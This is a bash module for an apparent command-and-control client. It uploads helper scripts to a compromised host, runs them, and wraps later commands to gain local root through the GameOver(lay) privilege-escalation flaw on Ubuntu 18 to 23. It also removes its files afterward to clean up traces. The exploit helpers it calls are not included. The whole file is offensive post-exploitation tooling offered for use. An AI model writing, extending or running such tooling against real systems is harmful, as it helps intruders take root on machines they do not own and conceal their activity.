#!/usr/bin/env bash
#c2-client module
#RiMyJcVwtt
#gameover

source funcmgr.sh

GAMEOVER_ACTIVE=0

print_warn() {
echo -e "${YELLOW}[!]${NC} $1" >&2
}

print_err() {
echo -e "${RED}[!]${NC} $1" >&2
}

print_std() {
echo -e "${GREEN}[+]${NC} $1"
}

print_help() {
echo -e "${BLUE}$1${NC} $2"
}

print_out() {
echo -e "${GREEN}[+]${YELLOW} $1${NC}"
}

RiMyJcVwtt_init() {
    register_function "enable_gameover" "enable_gameover" 0 "Setup gameover(lay) LPE command wrapper"
    register_function "disable_gameover" "disable_gameover" 0 "Disable gameover(lay) LPE command wrapper"
    register_exit_func "disable_gameover_exit"
}

RiMyJcVwtt_main() {
    :
}

RiMyJcVwtt_description() {
    echo "Gameover(lay) LPE command wrapper module"
}

RiMyJcVwtt_help() {
    print_help "enable_gameover" "Enable gameover(lay) LPE command wrapper. Suitable for Ubuntu 18 to 23"
    print_help "disable_gameover" "Disable gameover(lay) LPE command wrapper and clean up"
}

gameover_wrapper() {
  echo "./gameover_wrapper.sh $*"
}

enable_gameover() {
  if ! send_cmd "command -v python3 >/dev/null 2>&1"; then
        print_err "Skipping setup due to missing Python3."
        return 1
  fi

  if [[ $GAMEOVER_ACTIVE -eq 1 ]]; then
        print_warn "Gameover(lay) is already enabled."
        return 1
  fi

  print_std "Setting up gameover(lay)..."
  emergency_upload "./helpers/gameover.sh"
  emergency_upload "./helpers/gameover_wrapper.sh"
  send_cmd "chmod +x gameover.sh"
  send_cmd "chmod +x gameover_wrapper.sh"
  send_cmd "./gameover.sh"
  register_cmd_wrapper "gameover_wrapper"
  GAMEOVER_ACTIVE=1
  print_std "Setup completed"
}

disable_gameover() {
  if [[ $GAMEOVER_ACTIVE -eq 0 ]]; then
        print_warn "Cannot disable gameover(lay) because it is not active."
        return 1
  fi
  print_std "Disabling gameover(lay)..."
  unregister_cmd_wrapper
  print_std "Cleaning up..."
  send_cmd "rm gameover.sh gameover_wrapper.sh"
  send_cmd "rm -rf l m u w"
  GAMEOVER_ACTIVE=0
  print_std "Done"
}

disable_gameover_exit() {
  if [[ $GAMEOVER_ACTIVE -eq 1 ]]; then
  print_std "Disabling gameover(lay)..."
  unregister_cmd_wrapper
  print_std "Cleaning up..."
  send_cmd "rm gameover.sh gameover_wrapper.sh"
  send_cmd "rm -rf l m u w"
  GAMEOVER_ACTIVE=0
  print_std "Done"
  fi
}
